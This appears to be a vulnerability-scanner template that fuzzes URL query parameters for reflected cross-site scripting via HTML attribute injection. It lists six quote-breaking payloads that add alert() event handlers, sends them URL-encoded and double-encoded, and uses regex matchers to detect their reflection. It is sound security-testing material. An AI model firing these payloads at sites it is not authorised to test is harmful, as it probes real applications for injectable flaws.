id: xss-fuzz-html-attribute-injection

info:
  name: Reflected XSS Checks via HTML attribute injections
  author: quas
  severity: medium
  description: Fuzzes all query parameters for various reflected XSS vulnerabilities via HTML attribute injections.

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      xss_payloads:
        - "\" x=\"y\" onmouseover=\"alert('xss')"
        - "\" x=\"y\" onscrollsend=\"alert('xs')"
        - "\" x=\"y\" onfocus=\"alert('xss')"
        - "' x='y' onscrollsend='alert(1)"
        - "' x='y' onmouseover='alert(1)"
        - "' x='y' onfocus='alert(1)"
    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(xss_payloads)}}"
          - "{{url_encode(url_encode(xss_payloads))}}"
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "(?i)<[^>]* x=\"y\" onmouseover=\"alert\\('xss'\\)\"[^>]*>"
          - "(?i)<[^>]* x=\"y\" onscrollsend=\"alert\\('xs'\\)\"[^>]*>"
          - "(?i)<[^>]* x=\"y\" onfocus=\"alert\\('xss'\\)\"[^>]*>"
          - "(?i)<[^>]* x='y' onscrollsend='alert\\(1\\)'[^>]*>"
          - "(?i)<[^>]* x='y' onmouseover='alert\\(1\\)'[^>]*>"
          - "(?i)<[^>]* x='y' onfocus='alert\\(1\\)'[^>]*>"
      - type: word
        part: header
        words:
          - "text/html"

